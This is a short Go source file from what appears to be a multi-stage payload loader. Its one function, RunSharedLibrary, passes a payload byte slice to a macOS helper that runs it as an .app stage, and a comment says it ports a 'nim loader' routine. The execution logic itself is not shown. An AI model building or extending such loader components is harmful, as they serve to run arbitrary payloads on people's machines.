package stage

import "loader/utils/macapi"

// RunSharedLibrary — nim loader: runSharedLibrary (stage .app no mac).
func RunSharedLibrary(payload []byte) {
	// Runs the shared library stage from the payload
	_ = macapi.RunStageApp(payload)
}
